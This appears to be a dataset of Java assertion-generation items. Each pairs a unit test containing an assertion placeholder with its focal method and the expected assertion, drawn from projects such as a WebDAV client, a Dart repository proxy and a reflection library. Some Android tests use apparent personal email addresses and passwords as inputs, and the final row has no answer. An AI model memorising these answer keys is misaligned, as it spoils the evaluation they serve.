"filteredListSizeIsCorrect3() { int k = 7; // instantiate random filter with parameter k KRandomFilter filter = new KRandomFilter(k); // call filter method to obtain filtered list List<MutationInstance> filteredList = filter.filterMutants(toFilter); // filtered list should be of same size as toFilter ""<AssertPlaceHolder>""; }
filterMutants(List<MutationInstance> toFilter) {  // determine number of mutants to run int n = this.percent ? (guidance.getSeenMutants() * k / 100) : k;  // shuffle list of mutants to randomize first n elements Collections.shuffle(toFilter);  // add first k mutants in list to filtered list List<MutationInstance> filtered = new ArrayList<>(); for(int i = 0; i < n && i < toFilter.size(); i++){ filtered.add(toFilter.get(i)); }  return filtered; }"	assertEquals(toFilter.size(), filteredList.size())
"Exception { final Method triple = Narcissus.findMethod(X.class, ""triple"", int.class); ""<AssertPlaceHolder>""; }
invokeIntMethod(Object object, Method method, Object... args);  /** * Invoke a non-static long-return-type method, ignoring visibility and bypassing security checks. * * @param object *            the object instance to invoke the method on * @param method *            the non-static method * @param args *            the method arguments (or {@code new Object[0]}"	assertThat(Narcissus.invokeIntMethod(new X(), triple, 5)).isEqualTo(15)
"Exception { final List<String> fieldNames = new ArrayList<>(); for (final Field field : Narcissus.enumerateFields(Y.class)) { fieldNames.add(field.getName()); } ""<AssertPlaceHolder>""; }
enumerateFields(final Class<?> cls) { final List<Field> fields = new ArrayList<>(); for (Class<?> c = cls; c != null; c = c.getSuperclass()) { for (final Field field : getDeclaredFields(c)) { fields.add(field); } } return fields; }"	"assertThat(fieldNames).containsOnly(""i"", ""j"", ""s"", ""c"", ""b"", ""z"", ""f"", ""d"", ""_i"", ""_j"", ""_s"", ""_c"", ""_b"", ""_z"", ""_f"", ""_d"")"
"Exception { final List<String> methodNames = new ArrayList<>(); for (final Method method : Narcissus.enumerateMethods(Z.class)) { methodNames.add(method.getName()); } ""<AssertPlaceHolder>""; }
enumerateMethods(final Class<?> cls) { final List<Method> methodOrder = new ArrayList<>(); forAllMethods(cls, new MethodIterator() { @Override public boolean foundMethod(final Method m) { methodOrder.add(m); return false; } }); return methodOrder; }"	"assertThat(methodNames).contains(""i"", ""j"", ""s"", ""c"", ""b"", ""z"", ""f"", ""d"", ""_i"", ""_j"", ""_s"", ""_c"", ""_b"", ""_z"", ""_f"", ""_d"")"
"Exception { final C c = new C(); Narcissus.setField(c, Narcissus.findField(C.class, ""a""), new B()); ""<AssertPlaceHolder>""; }
findField(final Class<?> cls, final String fieldName) throws NoSuchFieldException { for (Class<?> c = cls; c != null; c = c.getSuperclass()) { for (final Field field : getDeclaredFields(c)) { if (field.getName().equals(fieldName)) { return field; } } } throw new NoSuchFieldException(fieldName); }"	assertThat(c.a instanceof B)
"Exception { final A retVal = (A) Narcissus.invokeStaticObjectMethod(Narcissus.findMethod(C.class, ""identA"", A.class), new B()); ""<AssertPlaceHolder>""; }
findMethod(final Class<?> cls, final String methodName, final Class<?>... paramTypes) throws NoSuchMethodException { final AtomicReference<Method> method = new AtomicReference<>(); forAllMethods(cls, new MethodIterator() { @Override public boolean foundMethod(final Method m) { if (m.getName().equals(methodName) && Arrays.equals(paramTypes, m.getParameterTypes())) { method.set(m); return true; } return false; } }); final Method m = method.get(); if (m != null) { return m; } else { throw new NoSuchMethodException(methodName); } }"	assertThat(retVal instanceof B)
"Exception { String emptySource = ""{""app_version"":""0.11.6"",""app_version_int"": 47,""subscriptions"":[]}"";  List<SubscriptionItem> items = ImportExportJsonHelper.readFrom(new ByteArrayInputStream( emptySource.getBytes(StandardCharsets.UTF_8)), null); ""<AssertPlaceHolder>""; }
readFrom( final InputStream in, @Nullable final ImportExportEventListener eventListener) throws InvalidSourceException { if (in == null) { throw new InvalidSourceException(""input is null""); }  final List<SubscriptionItem> channels = new ArrayList<>();  try { final JsonObject parentObject = JsonParser.object().from(in);  if (!parentObject.has(JSON_SUBSCRIPTIONS_ARRAY_KEY)) { throw new InvalidSourceException(""Channels array is null""); }  final JsonArray channelsArray = parentObject.getArray(JSON_SUBSCRIPTIONS_ARRAY_KEY);  if (eventListener != null) { eventListener.onSizeReceived(channelsArray.size()); }  for (Object o : channelsArray) { if (o instanceof JsonObject) { JsonObject itemObject = (JsonObject) o; int serviceId = itemObject.getInt(JSON_SERVICE_ID_KEY, 0); String url = itemObject.getString(JSON_URL_KEY); String name = itemObject.getString(JSON_NAME_KEY);  if (url != null && name != null && !url.isEmpty() && !name.isEmpty()) { channels.add(new SubscriptionItem(serviceId, url, name)); if (eventListener != null) { eventListener.onItemCompleted(name); } } } } } catch (Throwable e) { throw new InvalidSourceException(""Couldn't parse json"", e); }  return channels; }"	assertTrue(items.isEmpty())
"testInvalidSource() { List<String> invalidList = Arrays.asList( ""{}"", """", null, ""gibberish"");  for (String invalidContent : invalidList) { try { if (invalidContent != null) { byte[] bytes = invalidContent.getBytes(StandardCharsets.UTF_8); ImportExportJsonHelper.readFrom((new ByteArrayInputStream(bytes)), null); } else { ImportExportJsonHelper.readFrom(null, null); }  fail(""didn't throw exception""); } catch (Exception e) { boolean isExpectedException = e instanceof SubscriptionExtractor.InvalidSourceException; ""<AssertPlaceHolder>""; } } }
readFrom( final InputStream in, @Nullable final ImportExportEventListener eventListener) throws InvalidSourceException { if (in == null) { throw new InvalidSourceException(""input is null""); }  final List<SubscriptionItem> channels = new ArrayList<>();  try { final JsonObject parentObject = JsonParser.object().from(in);  if (!parentObject.has(JSON_SUBSCRIPTIONS_ARRAY_KEY)) { throw new InvalidSourceException(""Channels array is null""); }  final JsonArray channelsArray = parentObject.getArray(JSON_SUBSCRIPTIONS_ARRAY_KEY);  if (eventListener != null) { eventListener.onSizeReceived(channelsArray.size()); }  for (Object o : channelsArray) { if (o instanceof JsonObject) { JsonObject itemObject = (JsonObject) o; int serviceId = itemObject.getInt(JSON_SERVICE_ID_KEY, 0); String url = itemObject.getString(JSON_URL_KEY); String name = itemObject.getString(JSON_NAME_KEY);  if (url != null && name != null && !url.isEmpty() && !name.isEmpty()) { channels.add(new SubscriptionItem(serviceId, url, name)); if (eventListener != null) { eventListener.onItemCompleted(name); } } } } } catch (Throwable e) { throw new InvalidSourceException(""Couldn't parse json"", e); }  return channels; }"	"assertTrue("""""" + e.getClass().getSimpleName() + """" is not the expected exception"", isExpectedException)"
"testInvalidRead() { final List<String> invalidList = Arrays.asList( ""{""notTabsArray"":[]}"", ""{invalidJSON]}"", ""{}"" );  for (String invalidContent : invalidList) { try { TabsJsonHelper.getTabsFromJson(invalidContent);  fail(""didn't throw exception""); } catch (Exception e) { boolean isExpectedException = e instanceof TabsJsonHelper.InvalidJsonException; ""<AssertPlaceHolder>""; } } }
getTabsFromJson(@Nullable final String tabsJson) throws InvalidJsonException { if (tabsJson == null || tabsJson.isEmpty()) { return getDefaultTabs(); }  final List<Tab> returnTabs = new ArrayList<>();  final JsonObject outerJsonObject; try { outerJsonObject = JsonParser.object().from(tabsJson);  if (!outerJsonObject.has(JSON_TABS_ARRAY_KEY)) { throw new InvalidJsonException(""JSON doesn't contain """" + JSON_TABS_ARRAY_KEY + """" array""); }  final JsonArray tabsArray = outerJsonObject.getArray(JSON_TABS_ARRAY_KEY);  for (Object o : tabsArray) { if (!(o instanceof JsonObject)) { continue; }  final Tab tab = Tab.from((JsonObject) o);  if (tab != null) { returnTabs.add(tab); } } } catch (JsonParserException e) { throw new InvalidJsonException(e); }  if (returnTabs.isEmpty()) { return getDefaultTabs(); }  return returnTabs; }"	"assertTrue("""""" + e.getClass().getSimpleName() + """" is not the expected exception"", isExpectedException)"
"Exception { when(contextAttributes.require(AssetKind.class)).thenReturn(AssetKind.PACKAGE_ARCHIVE); when(dartFacet.get(TAR_PATH)).thenReturn(content); when(request.getPath()).thenReturn(TAR_PATH);  ""<AssertPlaceHolder>""; }
getCachedContent(Context context) throws IOException { AssetKind assetKind = context.getAttributes().require(AssetKind.class); String path = checkPath(context); switch (assetKind) { case PACKAGES_METADATA: return null; // never use the cache for /api/packages case PACKAGE_METADATA: return getDartFacet().get(path); case PACKAGE_VERSION_METADATA: return getDartFacet().get(path); case PACKAGE_ARCHIVE: return getDartFacet().get(path); default: throw new IllegalStateException(); } }"	assertThat(underTest.getCachedContent(context), is(content))
"Exception { when(contextAttributes.require(AssetKind.class)).thenReturn(AssetKind.PACKAGES_METADATA); when(dartFacet.get(PACKAGES_PATH)).thenReturn(content); when(request.getPath()).thenReturn(PACKAGES_PATH); // getCachedContent for api/packages should always return null ""<AssertPlaceHolder>""; }
getCachedContent(Context context) throws IOException { AssetKind assetKind = context.getAttributes().require(AssetKind.class); String path = checkPath(context); switch (assetKind) { case PACKAGES_METADATA: return null; // never use the cache for /api/packages case PACKAGE_METADATA: return getDartFacet().get(path); case PACKAGE_VERSION_METADATA: return getDartFacet().get(path); case PACKAGE_ARCHIVE: return getDartFacet().get(path); default: throw new IllegalStateException(); } }"	assertThat(underTest.getCachedContent(context) == null, is(true))
"Exception { when(contextAttributes.require(AssetKind.class)).thenReturn(AssetKind.PACKAGE_METADATA); when(dartFacet.get(PACKAGE_PATH)).thenReturn(content); when(request.getPath()).thenReturn(PACKAGE_PATH);  ""<AssertPlaceHolder>""; }
getCachedContent(Context context) throws IOException { AssetKind assetKind = context.getAttributes().require(AssetKind.class); String path = checkPath(context); switch (assetKind) { case PACKAGES_METADATA: return null; // never use the cache for /api/packages case PACKAGE_METADATA: return getDartFacet().get(path); case PACKAGE_VERSION_METADATA: return getDartFacet().get(path); case PACKAGE_ARCHIVE: return getDartFacet().get(path); default: throw new IllegalStateException(); } }"	assertThat(underTest.getCachedContent(context), is(content))
"Exception { when(contextAttributes.require(AssetKind.class)).thenReturn(AssetKind.PACKAGE_VERSION_METADATA); when(dartFacet.get(VERSION_PATH)).thenReturn(content); when(request.getPath()).thenReturn(VERSION_PATH);  ""<AssertPlaceHolder>""; }
getCachedContent(Context context) throws IOException { AssetKind assetKind = context.getAttributes().require(AssetKind.class); String path = checkPath(context); switch (assetKind) { case PACKAGES_METADATA: return null; // never use the cache for /api/packages case PACKAGE_METADATA: return getDartFacet().get(path); case PACKAGE_VERSION_METADATA: return getDartFacet().get(path); case PACKAGE_ARCHIVE: return getDartFacet().get(path); default: throw new IllegalStateException(); } }"	assertThat(underTest.getCachedContent(context), is(content))
"Exception { when(contextAttributes.require(AssetKind.class)).thenReturn(AssetKind.PACKAGES_METADATA); when(request.getPath()).thenReturn(PACKAGES_PATH); when(dartFacet.put(PACKAGES_PATH, content, AssetKind.PACKAGES_METADATA)).thenReturn(content);  when(viewFacet.dispatch(any(Request.class), eq(context))).thenReturn(response);  ""<AssertPlaceHolder>"";  verify(dartFacet).put(PACKAGES_PATH, content, AssetKind.PACKAGES_METADATA); }
store(Context context, Content content) throws IOException { AssetKind assetKind = context.getAttributes().require(AssetKind.class); String path = checkPath(context); switch (assetKind) { case PACKAGES_METADATA: return getDartFacet().put(path, content, assetKind); case PACKAGE_METADATA: return getDartFacet().put(path, content, assetKind); case PACKAGE_VERSION_METADATA: return getDartFacet().put(path, content, assetKind); case PACKAGE_ARCHIVE: return getDartFacet().put(path, content, assetKind); default: throw new IllegalStateException(); } }"	assertThat(underTest.store(context, content), is(content))
"Exception { when(contextAttributes.require(AssetKind.class)).thenReturn(AssetKind.PACKAGE_METADATA); when(request.getPath()).thenReturn(PACKAGE_PATH); when(dartFacet.put(PACKAGE_PATH, content, AssetKind.PACKAGE_METADATA)).thenReturn(content);  when(viewFacet.dispatch(any(Request.class), eq(context))).thenReturn(response);  ""<AssertPlaceHolder>"";  verify(dartFacet).put(PACKAGE_PATH, content, AssetKind.PACKAGE_METADATA); }
store(Context context, Content content) throws IOException { AssetKind assetKind = context.getAttributes().require(AssetKind.class); String path = checkPath(context); switch (assetKind) { case PACKAGES_METADATA: return getDartFacet().put(path, content, assetKind); case PACKAGE_METADATA: return getDartFacet().put(path, content, assetKind); case PACKAGE_VERSION_METADATA: return getDartFacet().put(path, content, assetKind); case PACKAGE_ARCHIVE: return getDartFacet().put(path, content, assetKind); default: throw new IllegalStateException(); } }"	assertThat(underTest.store(context, content), is(content))
"Exception { when(contextAttributes.require(AssetKind.class)).thenReturn(AssetKind.PACKAGE_VERSION_METADATA); when(request.getPath()).thenReturn(VERSION_PATH); when(dartFacet.put(VERSION_PATH, content, AssetKind.PACKAGE_VERSION_METADATA)).thenReturn(content);  when(viewFacet.dispatch(any(Request.class), eq(context))).thenReturn(response);  ""<AssertPlaceHolder>"";  verify(dartFacet).put(VERSION_PATH, content, AssetKind.PACKAGE_VERSION_METADATA); }
store(Context context, Content content) throws IOException { AssetKind assetKind = context.getAttributes().require(AssetKind.class); String path = checkPath(context); switch (assetKind) { case PACKAGES_METADATA: return getDartFacet().put(path, content, assetKind); case PACKAGE_METADATA: return getDartFacet().put(path, content, assetKind); case PACKAGE_VERSION_METADATA: return getDartFacet().put(path, content, assetKind); case PACKAGE_ARCHIVE: return getDartFacet().put(path, content, assetKind); default: throw new IllegalStateException(); } }"	assertThat(underTest.store(context, content), is(content))
"Exception { when(contextAttributes.require(AssetKind.class)).thenReturn(AssetKind.PACKAGE_ARCHIVE); when(request.getPath()).thenReturn(TAR_PATH); when(dartFacet.put(TAR_PATH, content, AssetKind.PACKAGE_ARCHIVE)).thenReturn(content);  when(viewFacet.dispatch(any(Request.class), eq(context))).thenReturn(response);  ""<AssertPlaceHolder>"";  verify(dartFacet).put(TAR_PATH, content, AssetKind.PACKAGE_ARCHIVE); }
store(Context context, Content content) throws IOException { AssetKind assetKind = context.getAttributes().require(AssetKind.class); String path = checkPath(context); switch (assetKind) { case PACKAGES_METADATA: return getDartFacet().put(path, content, assetKind); case PACKAGE_METADATA: return getDartFacet().put(path, content, assetKind); case PACKAGE_VERSION_METADATA: return getDartFacet().put(path, content, assetKind); case PACKAGE_ARCHIVE: return getDartFacet().put(path, content, assetKind); default: throw new IllegalStateException(); } }"	assertThat(underTest.store(context, content), is(content))
"Exception { when(request.getPath()).thenReturn(""/"" + PACKAGES_PATH); String result = underTest.checkPath(context);  ""<AssertPlaceHolder>""; }
checkPath(Context context) { String path = context.getRequest().getPath(); if (path.startsWith(""/"")) { path = path.substring(1); } return path; }"	assertThat(result.equals(PACKAGES_PATH), is(true))
"Exception { when(request.getPath()).thenReturn(PACKAGES_PATH); String result = underTest.checkPath(context);  ""<AssertPlaceHolder>""; }
checkPath(Context context) { String path = context.getRequest().getPath(); if (path.startsWith(""/"")) { path = path.substring(1); } return path; }"	assertThat(result.equals(PACKAGES_PATH), is(true))
"getUrlTestWithoutParams() { when(request.getPath()).thenReturn(""/"" + PACKAGES_PATH); when(request.getParameters()).thenReturn(new Parameters());  String result = underTest.getUrl(context);  ""<AssertPlaceHolder>""; }
getUrl(Context context) { StringBuilder builder = new StringBuilder(context.getRequest().getPath().substring(1)); Parameters params = context.getRequest().getParameters(); if (!params.isEmpty()) { builder.append('?'); params.forEach(p -> builder.append(p.getKey()).append('=').append(p.getValue()).append('&')); builder.deleteCharAt(builder.lastIndexOf(""&"")); } return builder.toString(); }"	assertThat(result.equals(PACKAGES_PATH), is(true))
"getUrlTestWithParams() { when(request.getPath()).thenReturn(""/"" + PACKAGES_PATH); Parameters params = new Parameters(); params.set(""page"", ""1""); when(request.getParameters()).thenReturn(params);  String result = underTest.getUrl(context);  ""<AssertPlaceHolder>""; }
getUrl(Context context) { StringBuilder builder = new StringBuilder(context.getRequest().getPath().substring(1)); Parameters params = context.getRequest().getParameters(); if (!params.isEmpty()) { builder.append('?'); params.forEach(p -> builder.append(p.getKey()).append('=').append(p.getValue()).append('&')); builder.deleteCharAt(builder.lastIndexOf(""&"")); } return builder.toString(); }"	"assertThat(result.equals(PACKAGES_PATH + ""?page=1""), is(true))"
"similarListTest() { List<String> list = HanziSimilarHelper.similarList('爱'); Assert.""<AssertPlaceHolder>""; }
similarList(char hanziOne) { return similarList(hanziOne, 10); }"	"assertEquals(""[爰, 爯, 受, 爭, 妥, 憂, 李, 爳, 叐, 雙]"", list.toString())"
"lbryToOdyseeString() { LbryUri obtained = new LbryUri();  try { obtained = LbryUri.parse(""lbry://@lbry#3f/lbryturns4#6"",false); } catch (LbryUriException e) { e.printStackTrace(); }  ""<AssertPlaceHolder>""; }
toOdyseeString() { return build(true, ODYSEE_COM_BASE_URL, false); }"	"assertEquals(""https://odysee.com/@lbry:3f/lbryturns4:6"", obtained.toOdyseeString())"
"testXmlVersionDeclaration() { String xml = SardineUtil.toXml(new Propfind()); ""<AssertPlaceHolder>""; }
toXml(Object jaxbElement) { StringWriter writer = new StringWriter(); try { getSerializer().write(jaxbElement, writer); } catch (Exception e) { throw new RuntimeException(e.getMessage(), e); } return writer.toString(); }"	"assertTrue(xml.startsWith(""<?xml version=""1.0"" encoding=""utf-8""?>""))"
"testPropSerialization() { Prop prop = new Prop(); List<Element> any = prop.getAny(); Element element1 = SardineUtil.createElement(SardineUtil.createQNameWithCustomNamespace(""hello"")); element1.setTextContent(""bla""); any.add(element1);  Element element2 = SardineUtil.createElement(SardineUtil.createQNameWithDefaultNamespace(""hello"")); element2.setTextContent(""bla""); any.add(element2);  prop.setDisplayname(""bli"");  String xml = SardineUtil.toXml(prop); String expectedXML = ""<?xml version=""1.0"" encoding=""utf-8""?>\n"" + ""<D:prop xmlns:D=""DAV:"">\n"" + ""   <s:hello xmlns:s=""SAR:"">bla</s:hello>\n"" + ""   <D:hello>bla</D:hello>\n"" + ""   <D:displayname>bli</D:displayname>\n"" + ""</D:prop>"";  ""<AssertPlaceHolder>""; }
toXml(Object jaxbElement) { StringWriter writer = new StringWriter(); try { getSerializer().write(jaxbElement, writer); } catch (Exception e) { throw new RuntimeException(e.getMessage(), e); } return writer.toString(); }"	assertEquals(expectedXML, xml)
"Exception { String xml = ""<D:prop xmlns:D=""DAV:"">\n"" + ""   <D:resourcetype/>\n"" + ""   <D:creationdate>2016-07-07T07:15:17Z</D:creationdate>\n"" + ""   <D:getcontentlength>31</D:getcontentlength>\n"" + ""   <D:getlastmodified>Thu, 07 Jul 2016 07:15:17 GMT</D:getlastmodified>\n"" + ""   <D:getetag>""f45e6a-1f-5370672b15b20""</D:getetag>\n"" + ""   <D:executable>F</D:executable>\n"" + ""   <D:supportedlock/>\n"" + ""   <D:lockdiscovery/>\n"" + ""   <D:getcontenttype>text/plain</D:getcontenttype>\n"" + ""</D:prop>"";  Prop prop = SardineUtil.unmarshal(Prop.class, new ByteArrayInputStream(xml.getBytes())); ""<AssertPlaceHolder>""; }
unmarshal(Class<? extends T> type, InputStream in) throws IOException { try { return getSerializer().read(type, in); } catch (SAXException e) { throw new RuntimeException(e.getMessage(), e); } catch (Exception e) { // Server does not return any valid WebDAV XML that matches our JAXB context throw new IOException(""Not a valid DAV response"", e); } }"	assertTrue(prop.getSupportedlock().getLockentryList().isEmpty())
"Exception { LockResponseHandler handler = new LockResponseHandler(); final String response = ""<?xml version=""1.0"" encoding=""utf-8""?>\n"" + ""<d:prop xmlns:d=""DAV:"">\n"" + ""  <d:lockdiscovery>\n"" + ""    <d:activelock>\n"" + ""      <d:lockscope>\n"" + ""        <d:exclusive/>\n"" + ""      </d:lockscope>\n"" + ""      <d:locktype>\n"" + ""        <d:write/>\n"" + ""      </d:locktype>\n"" + ""      <d:lockroot>\n"" + ""        <d:href>fake-lock-root</d:href>\n"" + ""      </d:lockroot>\n"" + ""      <d:depth>infinity</d:depth>\n"" + ""      <d:timeout>Second-</d:timeout>\n"" + ""      <d:locktoken>\n"" + ""        <d:href>fake-lock-token</d:href>\n"" + ""      </d:locktoken>\n"" + ""      <d:owner></d:owner>\n"" + ""    </d:activelock>\n"" + ""  </d:lockdiscovery>\n"" + ""</d:prop>""; final String token = handler.getToken(new ByteArrayInputStream(response.getBytes())); ""<AssertPlaceHolder>""; }
getToken(InputStream stream) throws IOException { Prop prop = SardineUtil.unmarshal(Prop.class, stream); return prop.getLockdiscovery().getActivelock().iterator().next().getLocktoken().getHref(); }"	"assertEquals(""fake-lock-token"", token)"
"Exception { MultiStatusResponseHandler handler = new MultiStatusResponseHandler(); try { handler.getMultistatus(new ByteArrayInputStream(""noxml"".getBytes())); fail(""Expected XML parsing failure""); } catch (IOException e) { ""<AssertPlaceHolder>""; } }
getMultistatus(InputStream stream) throws IOException { return SardineUtil.unmarshal(Multistatus.class, stream); }"	"assertEquals(""XMLStreamException"", e.getCause().getClass().getSimpleName())"
"Exception { MultiStatusResponseHandler handler = new MultiStatusResponseHandler(); final String response = ""<?xml version=""1.0"" encoding=""utf-8""?>"" + ""<D:multistatus xmlns:D=""DAV:"">"" + "" <D:response>"" + ""  <D:href>/alfresco/webdav/Data%20Dictionary/.DS_Store</D:href>"" + ""  <D:propstat>"" + ""   <D:prop>"" + ""    <D:displayname>.DS_Store</D:displayname>"" + ""    <D:getcontentlength>6148</D:getcontentlength>"" + ""    <D:getcontenttype>application/octet-stream</D:getcontenttype>"" + ""    <D:resourcetype/>"" + ""    <D:getlastmodified>Thu, 18 Nov 2010 23:04:47 GMT</D:getlastmodified>"" + ""    <D:lockdiscovery>"" + ""     <D:activelock>"" + ""      <D:locktype>"" + ""       <D:write/>"" + ""      </D:locktype>"" + ""      <D:lockscope>"" + ""       <D:D:exclusive/>"" + ""      </D:lockscope>"" + ""      <D:depth>0</D:depth>"" + ""      <D:owner/>"" + ""      <D:timeout>Infinite</D:timeout>"" + ""      <D:locktoken>"" + ""       <D:href>opaquelocktoken:28e080a3-2a77-4f35-a786-af0b984e6929:null</D:href>"" + ""      </D:locktoken>"" + ""     </D:activelock>"" + ""    </D:lockdiscovery>"" + ""   </D:prop>"" + ""   <D:status>HTTP/1.1 200 OK</D:status>"" + ""  </D:propstat>"" + "" </D:response>"" + ""</D:multistatus>""; try { handler.getMultistatus(new ByteArrayInputStream(response.getBytes())); fail(""Expected XML parsing failure""); } catch (IOException e) { ""<AssertPlaceHolder>""; } }
getMultistatus(InputStream stream) throws IOException { return SardineUtil.unmarshal(Multistatus.class, stream); }"	"assertEquals(""XMLStreamException"", e.getCause().getClass().getSimpleName())"
"IOException { String inputXML = ""<?xml version=""1.0"" encoding=""UTF-8""?>\n"" + ""<d:multistatus xmlns:d=""DAV:"" xmlns:s=""http://ns.jianguoyun.com"">\n"" + ""   <d:response>\n"" + ""      <d:href>/dav/Folder1/Folder2</d:href>\n"" + ""      <d:propstat>\n"" + ""         <d:prop>\n"" + ""            <d:getlastmodified>Wed, 18 Apr 2018 08:09:40 GMT</d:getlastmodified>\n"" + ""            <d:getcontentlength>0</d:getcontentlength>\n"" + ""            <d:getetag />\n"" + ""            <d:owner>test@test.com</d:owner>\n"" + ""            <d:current-user-privilege-set>\n"" + ""               <d:privilege>\n"" + ""                  <d:read />\n"" + ""               </d:privilege>\n"" + ""               <d:privilege>\n"" + ""                  <d:write />\n"" + ""               </d:privilege>\n"" + ""               <d:privilege>\n"" + ""                  <d:all />\n"" + ""               </d:privilege>\n"" + ""               <d:privilege>\n"" + ""                  <d:read_acl />\n"" + ""               </d:privilege>\n"" + ""               <d:privilege>\n"" + ""                  <d:write_acl />\n"" + ""               </d:privilege>\n"" + ""            </d:current-user-privilege-set>\n"" + ""            <d:getcontenttype>httpd/unix-directory</d:getcontenttype>\n"" + ""            <d:displayname>Folder2</d:displayname>\n"" + ""            <d:resourcetype>\n"" + ""               <d:collection />\n"" + ""            </d:resourcetype>\n"" + ""         </d:prop>\n"" + ""         <d:status>HTTP/1.1 200 OK</d:status>\n"" + ""      </d:propstat>\n"" + ""   </d:response>"" + ""</d:multistatus>"";  MultiStatusResponseHandler handler = new MultiStatusResponseHandler(); Multistatus status = handler.getMultistatus(new ByteArrayInputStream(inputXML.getBytes())); Prop prop = status.getResponse().get(0).getPropstat().get(0).getProp(); ""<AssertPlaceHolder>""; }
getMultistatus(InputStream stream) throws IOException { return SardineUtil.unmarshal(Multistatus.class, stream); }"	assertEquals(5, prop.getCurrentUserPrivilegeSet().privileges.size())
"InterruptedException { getInstrumentation().runOnMainSync(new Runnable() { @Override public void run() { EditText email = loginActivity.findViewById(R.id.emailLogin); EditText pass = loginActivity.findViewById(R.id.password); email.setText(""yash2000@gmail.com""); pass.setText(""241220""); Button loginBtn = loginActivity.findViewById(R.id.login); loginBtn.performClick(); ""<AssertPlaceHolder>""; loginActivity = null; } }); }
isCurUserLoggedIn(){ try{ System.out.println(mAuth.getCurrentUser().getUid()); }catch(Exception e){ return false; } return true; }"	assertFalse(loginActivity.isCurUserLoggedIn())
"InterruptedException { getInstrumentation().runOnMainSync(new Runnable() { @Override public void run() { loginActivity = mActivityTestRule.getActivity(); EditText email = loginActivity.findViewById(R.id.emailLogin); EditText pass = loginActivity.findViewById(R.id.password); email.setText(""yash2000@gmail.com""); pass.setText(""2412""); Button loginBtn = loginActivity.findViewById(R.id.login); loginBtn.performClick(); ""<AssertPlaceHolder>""; loginActivity = null; } }); }
isCurUserLoggedIn(){ try{ System.out.println(mAuth.getCurrentUser().getUid()); }catch(Exception e){ return false; } return true; }"	assertFalse(loginActivity.isCurUserLoggedIn())
"InterruptedException { getInstrumentation().runOnMainSync(new Runnable() { @Override public void run() { EditText email = RegisterActivity.findViewById(R.id.email); EditText pass = RegisterActivity.findViewById(R.id.passwd); email.setText(""yash2000@gmail.com""); pass.setText(""24122000""); Button registerBtn = RegisterActivity.findViewById(R.id.btnregister); registerBtn.performClick(); ""<AssertPlaceHolder>""; RegisterActivity = null; } }); }
isCurUserLoggedIn(){ try{ System.out.println(mAuth.getCurrentUser().getUid()); }catch(Exception e){ return false; } return true; }"	assertFalse(RegisterActivity.isCurUserLoggedIn())
"InterruptedException { getInstrumentation().runOnMainSync(new Runnable() { @Override public void run() { RegisterActivity = mActivityTestRule.getActivity(); EditText email = RegisterActivity.findViewById(R.id.email); EditText pass = RegisterActivity.findViewById(R.id.passwd); email.setText(""yash2009@gmail.com""); pass.setText(""2412""); Button registerBtn = RegisterActivity.findViewById(R.id.btnregister); registerBtn.performClick(); ""<AssertPlaceHolder>""; RegisterActivity = null; } }); }
isCurUserLoggedIn(){ try{ System.out.println(mAuth.getCurrentUser().getUid()); }catch(Exception e){ return false; } return true; }"	assertFalse(RegisterActivity.isCurUserLoggedIn())
"testToString() { Association a = Association.from(""thing"").to(""stuff"").zeroOne().propertyOrParameterName(""hello"") .responseCode(""200"").responseContentType(""application/json"").build(); ""<AssertPlaceHolder>""; }
toString() { StringBuilder b = new StringBuilder(); b.append(""Association [from=""); b.append(from); b.append("", to=""); b.append(to); b.append("", type=""); b.append(type); b.append("", responseCode=""); b.append(str(responseCode)); b.append("", responseContentType=""); b.append(str(responseContentType)); b.append("", propertyOrParameterName=""); b.append(str(propertyOrParameterName)); b.append(""]""); return b.toString(); }"	"assertEquals(""Association [from=thing, to=stuff, type=ZERO_ONE, responseCode=200, "" + ""responseContentType=application/json, propertyOrParameterName=hello]"", a.toString())"
"testToString() { Model model = new Model(// Lists.newArrayList(// new Class(""Thing"", ClassType.SCHEMA), // new Class(""Stuff"", ClassType.SCHEMA)), Lists.newArrayList(// Association.from(""Thing"").to(""Stuff"").zeroOne().build(), // Association.from(""Thing"").to(""Other"").one().build())); ""<AssertPlaceHolder>""; }
toString() { StringBuilder b = new StringBuilder(); b.append(""Model [""); b.append(classes.stream().map(x -> ""\n  "" + x).collect(joining("",""))); b.append(relationships.stream().map(x -> ""\n  "" + x).collect(joining("",""))); b.append(""\n]""); return b.toString(); }"	"assertEquals(""Model [\n"" + ""  Class [name=Thing, type=Schema, fields=[]],\n"" + ""  Class [name=Stuff, type=Schema, fields=[]]\n"" + ""  Association [from=Thing, to=Stuff, type=ZERO_ONE, responseCode=, "" + ""responseContentType=, propertyOrParameterName=],\n"" + ""  Association [from=Thing, to=Other, type=ONE, responseCode=, "" + ""responseContentType=, propertyOrParameterName=]\n]"", model.toString())"
"testLoadEmptyProtocolLibrary() { String openhufuRoot = System.getenv(""OPENHUFU_ROOT""); Path libDir = Paths.get(openhufuRoot, ""lib""); Map<ProtocolType, ProtocolFactory> factories = LibraryLoader.loadProtocolLibrary(libDir.toString()); ""<AssertPlaceHolder>""; }
loadProtocolLibrary(String libDir) { LOG.info(""Load library from {}"", libDir); File libJars[]= new File(libDir).listFiles(new FileFilter() { @Override public boolean accept(File file) { return file.getName().endsWith("".jar""); } }); List<URL> libURLs = new ArrayList<>(); for (File libJar : libJars) { try { libURLs.add(libJar.toURI().toURL()); LOG.info(""Add JAR {}"", libJar.getAbsolutePath()); } catch (Exception e) { LOG.error(""Add JAR {} error"", libJar.getAbsolutePath(), e); } } ClassLoader libClassLoader = new URLClassLoader(libURLs.toArray(new URL[0]), ProtocolFactory.class.getClassLoader()); ServiceLoader<ProtocolFactory> libs = ServiceLoader.load(ProtocolFactory.class, libClassLoader); ImmutableMap.Builder<ProtocolType, ProtocolFactory> builder = ImmutableMap.builder(); for (ProtocolFactory lib : libs) { LOG.info(""Load library of protocol {}"", lib.getType()); builder.put(lib.getType(), lib); } try { return builder.build(); } catch (IllegalArgumentException e) { LOG.error(""Duplicate protocol type found: {}"", e.getMessage()); return ImmutableMap.of(); } }"	assertTrue(factories.size() >= 0)
"Exception { ExecutorService service = Executors.newFixedThreadPool(partyNum); int taskId = 0;  int[] inputs = new int[partyNum]; inputs[0] = 30; inputs[1] = 29; inputs[2] = 229; inputs[3] = 129;  ArrayList<Future<Integer>> results = new ArrayList<>(); for (int p = 0; p < partyNum; p++) { MultiCmp cmp = cmps.get(p); int input = inputs[p]; Future<Integer> res = service.submit(new Callable<Integer>() { @Override public Integer call() throws Exception { LOG.info(""input = {}"", input); int ret = (int)cmp.run(taskId, ids, input, OperatorType.MAX); return ret; } }); results.add(res); } for (int p = 0; p < partyNum; p++) { int res = (int)(results.get(p).get()); if (p == 0) { ""<AssertPlaceHolder>""; } } }
